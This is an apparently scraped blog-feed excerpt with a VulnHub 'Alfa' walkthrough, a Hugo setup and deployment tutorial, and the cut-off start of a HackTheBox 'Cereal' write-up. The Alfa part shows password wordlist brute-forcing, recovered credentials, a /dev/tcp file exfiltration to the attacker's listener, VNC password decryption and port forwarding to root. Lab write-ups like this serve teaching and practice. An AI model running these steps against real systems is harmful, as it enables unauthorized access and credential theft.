Computer name: alfa | NetBIOS computer name: ALFA\\x00 | Domain name: \\x00 | FQDN: alfa |_ System time: 2021-04-22T08:41:36+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-22T06:41:36 |_ start_date: N/A Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Apr 22 02:41:38 2021 -- 1 IP address (1 host up) scanned in 26.16 seconds nmap identified anonymous access is allowed on FTP.\nPerforming a full port scan, discovers the fifth port.\n→ root@iamf «alfa» «192.168.2.103» $ nmap -p- nmap/10-allports-alfa 192.168.2.109 -v Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-22 02:53 EDT Nmap scan report for 192.168.2.109 Host is up (0.00040s latency). Not shown: 65530 closed ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 139/tcp open netbios-ssn 445/tcp open microsoft-ds 65111/tcp open unknown MAC Address: 08:00:27:9C:8A:46 (Oracle VirtualBox virtual NIC) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 36.32 seconds Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB) Poking port 65111 with nc reveals it\u0026rsquo;s SSH.\n→ root@iamf «alfa» «192.168.2.103» $ nc 192.168.2.109 65111 SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2 Enumeration TCP 21 - FTP Enumeration with on FTP discovers a potential username called thomas, an image file named milo.jpg.\n→ root@iamf «alfa» «192.168.2.103» $ ftp 192.168.2.109 Connected to 192.168.2.109. 220 (vsFTPd 3.0.3) Name (192.168.2.109:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 2 0 0 4096 Dec 17 13:02 thomas 226 Directory send OK. ftp\u0026gt; cd thomas 250 Directory successfully changed. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 104068 Dec 17 12:49 milo.jpg milo.jpg is a picture of a dog.\n TCP 445 - SMB On SMB, anonymous access is allowed but no read permission there.\n→ root@iamf «alfa» «192.168.2.103» $ crackmapexec smb 192.168.2.109 -u \u0026#39;ANONYMOUS\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 192.168.2.109 445 ALFA [*] Windows 6.1 (name:ALFA) (domain:) (signing:False) (SMBv1:True) SMB 192.168.2.109 445 ALFA [+] \\ANONYMOUS: SMB 192.168.2.109 445 ALFA [+] Enumerated shares SMB 192.168.2.109 445 ALFA Share Permissions Remark SMB 192.168.2.109 445 ALFA ----- ----------- ------ SMB 192.168.2.109 445 ALFA print$ Printer Drivers SMB 192.168.2.109 445 ALFA IPC$ IPC Service (Samba 4.9.5-Debian) TCP 80 - Web Visiting port 80 shows a website titled with \u0026ldquo;Alfa IT Solutions\u0026rdquo;.\n Nothing useful on the page source.\nGobuster gobuster scan discovers a robot.txt file\n→ root@iamf «alfa» «192.168.2.103» $ gobuster dir -u http://192.168.2.109/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -o gobuster/gobuster-L-80 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://192.168.2.109/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: html,txt,bak [+] Timeout: 10s =============================================================== 2021/04/22 02:46:48 Starting gobuster in directory enumeration mode =============================================================== /js (Status: 301) [Size: 311] [--\u0026gt; http://192.168.2.109/js/] /images (Status: 301) [Size: 315] [--\u0026gt; http://192.168.2.109/images/] /css (Status: 301) [Size: 312] [--\u0026gt; http://192.168.2.109/css/] /index.html (Status: 200) [Size: 3870] /fonts (Status: 301) [Size: 314] [--\u0026gt; http://192.168.2.109/fonts/] /robots.txt (Status: 200) [Size: 459] /server-status (Status: 403) [Size: 278] robots.txt Accessing robots.txt discovers some directories. But, these are just dummy.\n Poking the robots.txt file with curl discovers a string which looks like a brainfuck language.\n→ root@iamf «alfa» «192.168.2.103» $ curl -s http://192.168.2.109/robots.txt /home #404 /admin #404 /login #404 /images #200, directory listing, nothing interesting /cgi-bin #404 /intranet #404 /wp-admin #404 /wp-login #404 ...\u0026lt;SNIP\u0026gt;... ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;+++++++++++++++++.\u0026gt;\u0026gt;---.+++++++++++.------.-----.\u0026lt;\u0026lt;--.\u0026gt;\u0026gt;++++++++++++++++++.++.-----..-.+++.++. The string is translated as /alfa-support on site,\n /alfa-support On /alfa-support, there is a chat between Thomas as the employee and the IT support operator (I think?).\n From the conversation above, I\u0026rsquo;ll note that Thomas uses a password that consists of his(or her?) pet\u0026rsquo;s name followed by 3 numerical digits.\nFoothold Shell as Thomas Creating Wordlist From the previous FTP enumeration, \u0026lsquo;milo\u0026rsquo; is most likely the name of Thomas\u0026rsquo;s pet. With bash, I could generate all the possible password used by Thomas.\n→ root@iamf «alfa» «192.168.2.103» $ for i in {000..999}; do echo \u0026#34;milo$i\u0026#34;; done | tee passwords milo000 milo001 milo002 milo003 ...\u0026lt;snip\u0026gt;... Brute force - FTP I tried it with Hydra on FTP but returns nothing.\nroot@iamf «alfa» «192.168.2.103» $ hydra -l thomas -P passwords ftp://192.168.2.103 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-22 03:43:09 [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task [DATA] attacking ftp://192.168.2.103:21/ [STATUS] 320.00 tries/min, 320 tries in 00:01h, 713 to do in 00:03h, 16 active [STATUS] 317.00 tries/min, 634 tries in 00:02h, 399 to do in 00:02h, 16 active [STATUS] 315.67 tries/min, 947 tries in 00:03h, 86 to do in 00:01h, 16 active 1 of 1 target completed, 0 valid passwords found [WARNING] Writing restore file because 15 final worker threads did not complete until end. [ERROR] 15 targets did not resolve or could not be connected [ERROR] 0 targets did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-22 03:46:35 Brute force - SSH This time, I divided the wordlist into two files.\n passwords1: 000-500 passwords2: 500-999  And I\u0026rsquo;ll use crackmapexec:\n→ root@iamf «alfa» «192.168.2.103» $ crackmapexec ssh 192.168.2.109 -u thomas -p passwords2 --port 65111 After some minutes it returns one valid combination: thomas:milo666\n SSH - Thomas I\u0026rsquo;ll just log in via SSH and grabs the flag.\n→ root@iamf «alfa» «192.168.2.103» $ ssh -p 65111 thomas@192.168.2.109 thomas@192.168.2.109\u0026#39;s password: Linux Alfa 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 #################################################################### # ,---------------------------, # # | /---------------------\\ | # # | | | | # # | | +----+ | | # # | | |ALFA| | | # # | | +----+ | | # # | | | | # # | \\_____________________/ | # # |___________________________| # # ,---\\_____ [] _______/------, # # / /______________\\ /| # # /___________________________________ / | ___ # # | | | ) # # | _ _ _ [-------] | | ( # # | o o o [-------] | / _)_ # # |__________________________________ |/ / / # # /-------------------------------------/| ( )/ # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ / # # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ # # ██╗ ██╗███████╗██╗ ██████╗ ██████╗ ███╗ ███╗███████╗ # # ██║ ██║██╔════╝██║ ██╔════╝██╔═══██╗████╗ ████║██╔════╝ # # ██║ █╗ ██║█████╗ ██║ ██║ ██║ ██║██╔████╔██║█████╗ # # ██║███╗██║██╔══╝ ██║ ██║ ██║ ██║██║╚██╔╝██║██╔══╝ # # ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗ # # ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝ # #################################################################### thomas@Alfa:~$ id uid=1000(thomas) gid=1000(thomas) grupos=1000(thomas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) thomas@Alfa:~$ ls -l total 4 -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt Privilege Escalation Shell as root Internal enumeration In thomas\u0026rsquo;s home directory, there is a file called .remote-secret and it is owned by root but world-writable.\nthomas@Alfa:~$ ls -la total 40 drwxr-xr-x 4 thomas thomas 4096 dic 20 22:22 . drwxr-xr-x 3 root root 4096 dic 16 07:58 .. -rw------- 1 thomas thomas 4 dic 20 22:22 .bash_history -rw-r--r-- 1 thomas thomas 220 dic 16 07:58 .bash_logout -rw-r--r-- 1 thomas thomas 3526 dic 16 07:58 .bashrc drwx------ 3 thomas thomas 4096 dic 16 21:15 .gnupg drwxr-xr-x 3 thomas thomas 4096 dic 16 20:44 .local -rw-r--r-- 1 thomas thomas 807 dic 16 07:58 .profile -rwxrwxrwx 1 root root 16 dic 17 23:35 .remote_secret -rw-r--r-- 1 thomas thomas 1332 dic 20 11:04 user.txt At first, I assumed it was some kind of service hijacking, but the file contents appeared to be encrypted.\nthomas@Alfa:~$ cat .remote_secret �\u0026#34;�Cc�\u0026#34;�Cc Running pspy discovers a VNC server running locally with root access on port 5901.\n2021/04/22 10:47:57 CMD: UID=0 PID=404 | /usr/bin/Xtigervnc :1 -desktop Alfa:1 (root) -auth /root/.Xauthority -geometry 1900x1200 -depth 24 -rfbwait 30000 -rfbauth /root/.vnc/passwd -rfbport 5901 -pn -localhost -SecurityTypes VncAuth VNC Decrypt This .remote_secret is a VNC password file and I could use vncpwd to decrypt it (I\u0026rsquo;ve also done this previously on HTB: Cascade). I\u0026rsquo;ll transfer the file to my attacking machine and decrypt it there.\nOn Alfa:\nthomas@Alfa:~$ cat .remote_secret \u0026gt; /dev/tcp/192.168.2.103/9000 On my Kali:\n→ root@iamf «alfa» «192.168.2.103» $ nc -nvlp 9000 \u0026gt; remote_secret listening on [any] 9000 ... connect to [192.168.2.103] from (UNKNOWN) [192.168.2.109] 57532 The file content is decrypted to k!LL3rSs\n→ root@iamf «alfa» «192.168.2.103» $ ./vncpwd remote_secret Password: k!LL3rSs I tried the password on root, but it didn\u0026rsquo;t work. Last option here is to access the VNC server.\nAccessing VNC Since the VNC server is not accessible from outside, I\u0026rsquo;ll need a port forwarding to interact with it.\nOn thomas\u0026rsquo;s session\nthomas@Alfa:~$ ~C ssh\u0026gt; -L 5901:localhost:5901 Forwarding port. That will create a tunnel from my Kali localhost:5901 =\u0026gt; Alfa\u0026rsquo;s localhost:5901\nNow I can try to connect to the VNC server using vncviewer (it\u0026rsquo;s preinstalled on Kali) and provide remote_secret as the password file.\n→ root@iamf «alfa» «192.168.2.103» $ vncviewer -passwd remote_secret 127.0.0.1:5901 Connected to RFB server, using protocol version 3.8 Performing standard VNC authentication Authentication successful Desktop name \u0026#34;Alfa:1 (root)\u0026#34; VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Same machine: preferring raw encoding It opens this Windows, and I\u0026rsquo;m already on root.\n To be honest, this is actually guessing.\nAt first I doubt that this remote_secret is shared with root user, but that\u0026rsquo;s how I pwned this machine.\nReferences  https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc  ","permalink":"https://fahmifj.github.io/writeups/vulnhub/vh-alfa/","summary":"Alfa starts with enumeration on FTP to obtain a username and an image file, and the image file is named after the user\u0026rsquo;s pet. Alfa\u0026rsquo;s website has a robots.txt file which contains an obfuscated web path to intranet chat support. The chat conversation reveals sensitive information, and with this, I\u0026rsquo;m able to guess the user\u0026rsquo;s password and gain a foothold on the system. In the user\u0026rsquo;s home directory, there is a VNC password and it can be used to log into the currently running VNC server as root.","tags":["OSCP-like","Linux","Brainfuck","Brute-force","Hydra","Port-forwarding","Tunneling","VNC","vncpwd","vncviewer"],"title":"VulnHub - Alfa"},{"content":"Looking back at my first post, I said that I was using Hugo to build this blog. So in this post, I’ll share how to create your own!\nGoals Below are the main goals of this post:\n Installing Hugo Using Hugo theme Deploying Hugo site with Github  Prerequisites There are some prerequisites needed to accomplish these goals:\n A GitHub account Git Bash for Windows users Basics knowledge of Git (commit, push, pull, creating repository, know what is local and remote repository) Basics knowledge/use of CLI (cd, ls, pwd, mv, rm, mkdir)  If all set, then let\u0026rsquo;s get started\n01. Installing Hugo First, download Hugo executable binary at:\n https://github.com/gohugoio/hugo/releases  Pick your Hugo version according to what OS you’re on. There is also the extended version, which you should use if you’re building your own theme or picking a theme that uses Sass/SCSS.\nI will assume that you have downloaded the binary and extracted it somewhere on your system.\n$ ls -l total 47488 -rw-r--r-- 1 Fahmi FJ 197121 11357 Mar 22 00:17 LICENSE -rw-r--r-- 1 Fahmi FJ 197121 12345 Mar 22 00:17 README.md -rwxr-xr-x 1 Fahmi FJ 197121 48599040 Mar 22 01:04 hugo.exe Let\u0026rsquo;s test it on terminal by typing:\n$ hugo.exe version hugo v0.82.0-9D960784+extended windows/amd64 BuildDate=2021-03-21T17:28:04Z VendorInfo=gohugoio At this time, Hugo’s binary is not available in a system-wide (it’s not accessible outside the current directory).\nSo, let\u0026rsquo;s make it accessible from anywhere by adding the binary location to what is known as PATH variable.\n01.1. Windows For Windows users, let\u0026rsquo;s create a folder called bin in C:/ .\nC:\\\u0026gt;mkdir bin Once the folder is created, move your Hugo binary into it.\nC:\\\u0026gt;dir bin Volume in drive C is Windows Volume Serial Number is AC06-7D93 Directory of C:\\bin 13/06/2021 08:07 \u0026lt;DIR\u0026gt; . 13/06/2021 08:07 \u0026lt;DIR\u0026gt; .. 22/03/2021 01:04 48.599.040 hugo.exe 1 File(s) 48.599.040 bytes 2 Dir(s) 57.909.837.824 bytes free After that, hit Win + R on your keyboard and type:\nrundll32.exe sysdm.cpl,EditEnvironmentVariables You should see a window with \u0026ldquo;Environment Variables\u0026rdquo; in the title. We\u0026rsquo;re going to edit Path variable, so select that Path variable and click on Edit button.\n On the Edit window, click on New button to add a new path and type C:\\bin.\n After that, just hit all the OK button.\nOpen your Windows terminal and run hugo version. If it returns the same output as previous one, then go to the section 02.\n01.2. Linux  I know those who uses Linux probably already know how to 😁.\n For Linux users, let\u0026rsquo;s create a folder called bin under /home/username/.local/[here].\n$ mkdir -p ~/.local/bin Open your .bashrc or .zshrc file, it is located at /home/username/.[zsh|bash]rc, with your favorite text editor such as vim and simply add these line at the top of your .bashrc/.zshrc\nPATH_HUGO=\u0026#39;/home/username/.local/bin\u0026#39; export PATH=$PATH_HUGO:$PATH Reopen your terminal and run hugo version from any directory and see if it\u0026rsquo;s returns the version.\n02. Creating Your First Site We can create a site from anywhere by issuing the following command:\n$ hugo new site [site-name]  I recommend you to create a site in a specific folder such as workspace.\n For now, let\u0026rsquo;s create a site called my-blog.\n$ hugo new site my-blog Congratulations! Your new Hugo site is created in C:\\Users\\fahmi\\Desktop\\test\\my-blog. Just a few more steps and you\u0026#39;re ready to go: 1. Download a theme into the same-named folder. Choose a theme from https://themes.gohugo.io/ or create your own with the \u0026#34;hugo new theme \u0026lt;THEMENAME\u0026gt;\u0026#34; command. 2. Perhaps you want to add some content. You can add single files with \u0026#34;hugo new \u0026lt;SECTIONNAME\u0026gt;\\\u0026lt;FILENAME\u0026gt;.\u0026lt;FORMAT\u0026gt;\u0026#34;. 3. Start the built-in live server via \u0026#34;hugo server\u0026#34;. Visit https://gohugo.io/ for quickstart guide and full documentation. You can see that Hugo creates a new folder called my-blog at C:\\Users\\fahmi\\Desktop\\test\\my-blog, and my-blog has the following directory structure:\nmy-blog ├── archetypes │ └── default.md ├── config.toml ├── content ├── data ├── layouts ├── static └── themes Go to the my-blog folder and type hugo server in the terminal to host it locally.\n$ cd my-blog $ hugo server By default, the site is hosted at http://localhost:1313/ , but it\u0026rsquo;s still empty because we haven\u0026rsquo;t added any content yet.\n03. Installing Hugo Theme My blog uses a theme called PaperMod, so l\u0026rsquo;ll be using that too here.\nFirst, let\u0026rsquo;s delete the previous my-blog and recreate it with the following command:\n$ hugo new site my-blog -f yml Let\u0026rsquo;s move into my-blog and initialize a git repository there.\n$ cd my-blog $ git init After that, go to the themes folder and clone the PaperMod theme there.\n$ cd themes $ git clone https://github.com/adityatelange/hugo-PaperMod PaperMod --depth=1 We’ll add the theme as a submodule of my-blog.\n$ git submodule add https://github.com/adityatelange/hugo-PaperMod.git PaperMod Now, let\u0026rsquo;s go back to the root directory (my-blog), then replace/overwrite our config.yml with this, but change the value of baseUrl and theme to these:\nbaseURL: \u0026#34;\u0026#34; theme: PaperMod Test it with:\n$ hugo server 04. Creating Your First Post We can create a new post with by issuing the following command:\n$ hugo new post/new-post.md You can edit new-post.md after that, the file should be under my-blog/content/post/[here].\n$ ls -l my-blog/content/post/ total 1 -rw-r--r-- 1 Fahmi FJ 197121 70 Jun 13 09:34 my-post.md To see your post in the site, change the value draft from true to false:\n--- title: \u0026#34;My Post\u0026#34; date: 2021-06-13T09:34:43+07:00 draft: false --- My first post It should be on your site now.\n05. Deploying Site on GitHub From here, thing you need to know that when you run hugo server, Hugo will generate all the site resources and serve them from memory. But, if you run hugo, Hugo will generates all the site resources inside public folder (my-blog/public/[here]).\nThe files in this public folder are the files that we are going to host on GitHub. We can simply upload all the files in the public folder into a GitHub repository.\nI\u0026rsquo;m not good at explaining it on English, so let\u0026rsquo;s do that in action!\nBut, before that, you have to change your site\u0026rsquo;s base URL in config.yml to:\nbaseURL: \u0026#34;https://[your_user_name].github.io/my-blog/\u0026#34; For example, my username is fahmifj , so my config would be:\nbaseURL: \u0026#34;https://fahmifj.github.io/my-blog/\u0026#34; Once you done with the config, type hugo at the site root directory, Hugo will re-generates the web files at the public folder.\n$ hugo Start building sites … | EN | FR | FA -------------------+----+----+----- Pages | 14 | 10 | 10 Paginator pages | 0 | 0 | 0 Non-page files | 0 | 0 | 0 Static files | 0 | 0 | 0 Processed images | 0 | 0 | 0 Aliases | 3 | 0 | 1 Sitemaps | 2 | 1 | 1 Cleaned | 0 | 0 | 0 Total in 147 ms After that, create a new repository called my-blog on GitHub.\nOnce the repo is created, click on Upload an existing file.\n Then simply drag and drop all the files from the public folder there.\n Once all the files are uploaded, commit the changes, I\u0026rsquo;ll leave the commit message as default.\n After that, go the GitHub pages settings at https://github.com/your-username/my-blog/settings/pages to host your site.\n There you go!\n If you don\u0026rsquo;t see your site there or it returns a 404 error, just wait for a few minutes more.\nFrom here, we learned how to deploy/host our Hugo site on GitHub. However, this is not an efficient method of updating your site, therefore let\u0026rsquo;s write a deployment script.\n06. Deployment Script Assuming you\u0026rsquo;re inside my-blog , then go to the public directory, do files and folders clean up then initialize a git repository there.\n$ cd public $ rm -rf * $ git init Still inside the public directory, set the previously created my-blog repository as the remote repository and run git pull afterwards.\n$ git remote add origin https://github.com/your-username/my-blog.git $ git pull origin main Return to the site root directory then add the public folder as a submodule.\n$ cd ../ $ git submodule add https://github.com/your-username/my-blog.git public Now let\u0026rsquo;s create a deployment script at the site root directory and name it as deploy.sh:\n#!/bin/bash  echo -e \u0026#34;\\033[0;32mDeploying blog to GitHub...\\033[0m\u0026#34; # Clean public folder hugo --cleanDestinationDir # Go to to public folder cd public/ # Add untracked files, hide output git add -A \u0026gt; /dev/null # Generate a fixed commit message with date and time msg=\u0026#34;[`date \u0026#34;+%R %d-%h-%Y\u0026#34;]` Site update\u0026#34; # Check for additional commit message read -p \u0026#34;Add commit message: \u0026#34; add_msg if [ \u0026#34;$add_msg\u0026#34; != \u0026#34;\u0026#34; ] then msg=\u0026#34;$msg- $add_msg\u0026#34; fi git commit -m \u0026#34;$msg\u0026#34; # Deploy git push -u origin main # Go back to the root directory cd ../ In Windows, even though it is a bash script, it will work with Git Bash.\nLet\u0026rsquo;s test it by creating a new post.\n$ hugo new post/second-post.md $ echo \u0026#39;This is second post\u0026#39; \u0026gt;\u0026gt; content/post/second-post.md Don\u0026rsquo;t forget to change the value of draft from true to false!\nNow we can run the script, the output should looks something like this:\n(my-blog)$ ./deploy.sh Deploying blog to GitHub... Start building sites … | EN | FR | FA -------------------+----+----+----- Pages | 15 | 10 | 10 Paginator pages | 0 | 0 | 0 Non-page files | 0 | 0 | 0 Static files | 0 | 0 | 0 Processed images | 0 | 0 | 0 Aliases | 3 | 0 | 1 Sitemaps | 2 | 1 | 1 Cleaned | 0 | 0 | 0 Total in 155 ms Add commit message: [main af4c483] [11:00 13-Jun-2021] Site update 9 files changed, 459 insertions(+), 8 deletions(-) create mode 100644 post/second-post/index.html Enumerating objects: 27, done. Counting objects: 100% (27/27), done. Delta compression using up to 8 threads Compressing objects: 100% (13/13), done. Writing objects: 100% (15/15), 3.54 KiB | 1.77 MiB/s, done. Total 15 (delta 9), reused 0 (delta 0), pack-reused 0 remote: Resolving deltas: 100% (9/9), completed with 7 local objects. To https://github.com/fahmifj/my-blog.git f7141a3..af4c483 main -\u0026gt; main Branch \u0026#39;main\u0026#39; set up to track remote branch \u0026#39;main\u0026#39; from \u0026#39;origin\u0026#39;. If we check our repo it should be updated.\n That\u0026rsquo;s how I deployed my blog at the first time.\nBut still, this is inefficient method because it wastes your bandwidth, thus in the next post, let\u0026rsquo;s employ GitHub action 😼.\nIn the meantime, try reading the following documentation:\n https://gohugo.io/content-management/sections/ https://gohugo.io/content-management/front-matter/ https://gohugo.io/content-management/page-bundles/ https://gohugo.io/content-management/urls/  ","permalink":"https://fahmifj.github.io/blog/hugo-setup-and-deployment/","summary":"Looking back at my first post, I said that I was using Hugo to build this blog. So in this post, I’ll share how to create your own!\nGoals Below are the main goals of this post:\n Installing Hugo Using Hugo theme Deploying Hugo site with Github  Prerequisites There are some prerequisites needed to accomplish these goals:\n A GitHub account Git Bash for Windows users Basics knowledge of Git (commit, push, pull, creating repository, know what is local and remote repository) Basics knowledge/use of CLI (cd, ls, pwd, mv, rm, mkdir)  If all set, then let\u0026rsquo;s get started","tags":["Hugo","Tutorial"],"title":"Hugo Setup and Deployment"},{"content":"Cereal is a hard difficulty Windows machine that features a misconfigured web server which exposes source code of the currently hosted web application. A deleted JWT secrets is found in the source code, which can be used to forge my own JWT token and bypass the application login page. After reviewing the source code, the web app is found to be vulnerable to a deserialization attack. There is also a XSS vulnerability in one of the package used by the application. Chaining these vulnerabilities allows me to gain a foothold in the system.\nSkills Learned  Code review JWT authentication bypass XSS exploitation .NET deserialization  Tools  Kali Linux 2019.4 (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux  Reconnaissance Nmap All TCP ports scan with nmap discovers three open ports: SSH on port 22, HTTP on port 80, and HTTP on port 443.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p- --min-rate 1000 --reason -oA nmap/10-tcp-allport-cereal 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:45 EDT ...\u0026lt;SNIP\u0026gt;... PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 127 80/tcp open http syn-ack ttl 127 443/tcp open https syn-ack ttl 127 Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds I\u0026rsquo;ll run another scan with nmap \u0026rsquo;s default scripts.\n→ root@kali «cereal» «10.10.14.3» $ nmap -p 22,80,443 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.217 Starting Nmap 7.80 ( https://nmap.org ) at 2021-06-04 23:51 EDT ...\u0026lt;SNIP\u0026gt;... PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 08:8e:fe:04:8c:ad:6f:df:88:c7:f3:9a:c5:da:6d:ac (RSA) | 256 fb:f5:7b:a1:68:07:c0:7b:73:d2:ad:33:df:0a:fc:ac (ECDSA) |_ 256 cc:0e:70:ec:33:42:59:78:31:c0:4e:c2:a5:c9:0e:1e (ED25519) 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Did not follow redirect to https://cereal.htb/ |_https-redirect: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Cereal | ssl-cert: Subject: commonName=cereal.htb | Subject Alternative Name: DNS:cereal.htb, DNS:source.cereal.htb | Not valid before: 2020-11-11T19:57:18 |_Not valid after: 2040-11-11T20:07:19 |_ssl-date: 2021-06-05T03:51:48+00:00; +5s from scanner time. | tls-alpn: |_ http/1.1 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 4s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.34 seconds This time nmap found two hostnames from the SSL certificate: cereal.htb and source.cereal.htb.\nI\u0026rsquo;ll add those hostnames to my /etc/hosts:\n→ root@kali «cereal» «10.10.14.3» $ echo \u0026#39;10.10.10.217 cereal.htb source.cereal.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Enumeration TCP 80 It redirects to the HTTPS.\nTCP 443 - cereal.htb Following the redirection ends up at a login form.\n I tried a few common credentials but doesn\u0026rsquo;t seem to work here.\nInspecting the source reveals that this site is a react based application.\n If I track down the authentication process, this site store the authentication data in browser\u0026rsquo;s local storage with a key name of currentUser.\n But l\u0026rsquo;ll leave it for now.\nI also did a gobuster scan, but didn\u0026rsquo;t find anything useful.\nTCP 443 - source.cereal.htb Visiting source.cereal.htb shows a server error message of an ASP.net application:\n Nothing I can do on this page, but I\u0026rsquo;ll take note on the leaked file path:\n C:\\inetpub\\source\\default.aspx  Gobuster gobuster scan discovers a git repository, and there is also an upload directory.\n→ root@kali «cereal» «10.10.14.3» $ gobuster dir -u https://source.cereal.htb -k -w /opt/SecLists/Discovery/Web-Content/common.txt -x aspx,txt =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://source.cereal.htb [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: aspx,txt [+] Timeout: 10s =============================================================== 2021/06/05 00:52:32 Starting gobuster in directory enumeration mode =============================================================== /.git/HEAD (Status: 200) [Size: 23] /Default.aspx (Status: 500) [Size: 10090] /aspnet_client (Status: 301) [Size: 163] [--\u0026gt; https://source.cereal.htb/aspnet_client/] /default.aspx (Status: 500) [Size: 9727] /uploads (Status: 301) [Size: 157] [--\u0026gt; https://source.cereal.htb/uploads/] =============================================================== 2021/06/05 00:54:41 Finished =============================================================== Accessing the .git and the uploads directory are forbidden.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/ \u0026amp;\u0026amp; curl -I -k http://source.cereal.htb/uploads/ HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:25 GMT HTTP/1.1 403 Forbidden Content-Length: 1233 Content-Type: text/html Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:08:16 GMT But requesting files under .git directory are allowed.\n→ root@kali «cereal» «10.10.14.3» $ curl -I -k http://source.cereal.htb/.git/HEAD HTTP/1.1 200 OK Content-Length: 23 Content-Type: text/plain Last-Modified: Wed, 11 Nov 2020 20:09:34 GMT Accept-Ranges: bytes ETag: \u0026#34;adc1d19266b8d61:0\u0026#34; Server: Microsoft-IIS/10.0 X-Powered-By: Sugar Date: Sat, 05 Jun 2021 05:01:29 GMT → root@kali «cereal» «10.10.14.3» $ curl -s -k http://source.cereal.htb/.git/HEAD ref: refs/heads/master I\u0026rsquo;ll note the uploads directory\nGit Dumping .git directory With git-dumper, I could get all the files in that .git directory.\n→ root@kali «cereal» «10.10.14.3» $ mkdir loot/source-cereal-git \u0026amp;\u0026amp; ./git-dumper.py https://source.cereal.htb/.git loot/source-cereal-git [-] Testing https://source.cereal.htb/.git/HEAD [200] [-] Testing https://source.cereal.htb/.git/ [403] [-] Fetching common files [-] Fetching https://source.cereal.htb/.gitignore [404] [-] Fetching https://source.cereal.htb/.git/hooks/applypatch-msg.sample [404] [-] Fetching https://source.cereal.htb/.git/COMMIT_EDITMSG [200] [-] Fetching https://source.cereal.htb/.git/description [200] ...\u0026lt;SNIP\u0026gt;... [-] Finding refs/ [-] Fetching https://source.cereal.htb/.git/ORIG_HEAD [404] [-] Fetching https://source.cereal.htb/.git/config [200] [-] Fetching https://source.cereal.htb/.git/FETCH_HEAD [404] [-] Fetching https://source.cereal.htb/.git/HEAD [200] ...\u0026lt;SNIP\u0026gt;... [-] Finding packs [-] Finding objects [-] Fetching objects [-] Fetching https://source.cereal.htb/.git/objects/8f/2a1a88f15b9109e1f63e4e4551727bfb38eee5 [200] ...\u0026lt;SNIP\u0026gt;... [-] Running git checkout . Git History I could see the history of this 